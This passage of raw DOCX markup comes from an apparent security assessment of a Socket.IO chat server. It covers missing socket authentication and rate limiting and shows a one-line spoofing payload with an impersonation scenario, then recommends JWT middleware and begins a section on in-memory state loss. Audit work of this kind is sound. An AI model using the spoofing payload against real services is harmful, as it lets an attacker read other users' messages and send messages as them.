    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The WebSocket layer (Socket.IO) does not implement server-side authentication or authorization for incoming socket connections and events. Any client that can establish a WebSocket connection can emit events with arbitrary payloads.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability A — No Socket Authentication:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// server.js — Socket connection handler:</w:t>
        <w:br/>
        <w:t>io.on("connection", (socket) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    socket.on("setup", async (userData) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (!userData || !userData._id) return;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        const userId = userData._id.toString();</w:t>
        <w:br/>
        <w:t xml:space="preserve">        socket.userId = userId;              // Server trusts client-provided userId</w:t>
        <w:br/>
        <w:t xml:space="preserve">        socketToUser.set(socket.id, userId);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        socket.join(userId);                 // Joins the user's private room</w:t>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> event accepts a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>userData</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> object directly from the client </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>without any JWT verification</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. A malicious client could send:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>socket.emit("setup", { _id: "victimUserId123" });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>This would allow the attacker to: - Join the victim's private Socket.IO room - Receive all real-time messages intended for the victim - Appear as "online" under the victim's identity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability B — No Rate Limiting on Socket Events:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">There is no mechanism to throttle or rate-limit socket event emissions. A malicious client could: - Emit thousands of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>typing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> events per second, flooding all connected clients - Emit rapid </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>new message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> events, creating a denial-of-service condition - Emit repeated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>mark messages read</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> events, generating unnecessary database writes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Threat Scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Attacker opens a raw WebSocket connection to the server. 2. Attacker emits </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> with another user's </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>_id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (which may be guessable or obtained through the search API). 3. Attacker now receives all real-time messages sent to that user. 4. Attacker emits </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>new message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> events with the victim's identity, sending messages on their behalf.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- The Socket.IO server requires a valid connection to be established (TCP handshake), providing transport-level filtering. - REST API endpoints that persist data (send message, mark read) require valid JWT tokens, so permanent data mutations are still authenticated. - The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>setup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> handler checks for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>userData._id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> presence but not its validity.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add Socket.IO authentication middleware to verify JWT on connection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Validate </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>userData._id</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> against the JWT-decoded user identity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement per-socket event rate limiting (e.g., max 10 events/second)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Add socket-level authorization checks for room-specific events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// Recommended Socket.IO authentication middleware:</w:t>
        <w:br/>
        <w:t>io.use(async (socket, next) =&gt; {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    const token = socket.handshake.auth.token;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if (!token) return next(new Error("Authentication required"));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        const decoded = jwt.verify(token, process.env.JWT_SECRET);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        socket.userId = decoded.id;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        next();</w:t>
        <w:br/>
        <w:t xml:space="preserve">    } catch (err) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        next(new Error("Invalid token"));</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t>});</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Risk Area 3: In-Memory State Volatility</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The system's real-time presence tracking relies entirely on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>volatile in-memory data structures</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> that are lost upon server restart, crash, or deployment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// server.js, lines 81-83:</w:t>
        <w:br/>
        <w:t>const onlineUsers = new Map();      // Lost on server restart</w:t>
        <w:br/>
        <w:t>const socketToUser = new Map();     // Lost on server restart</w:t>
        <w:br/>
        <w:t>const socketAwayMap = new Map();    // Lost on server restart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">These three Map objects constitute the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>single source of truth</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for: - Which users are currently online - Which socket connections belong to which users - Which tabs/sockets are in an "away" state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Threat Scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Server crashes due to an unhandled exception or is restarted for deployment. 2. All three Maps are instantiated as empty objects. 3. All currently connected users are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>immediately considered offline</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
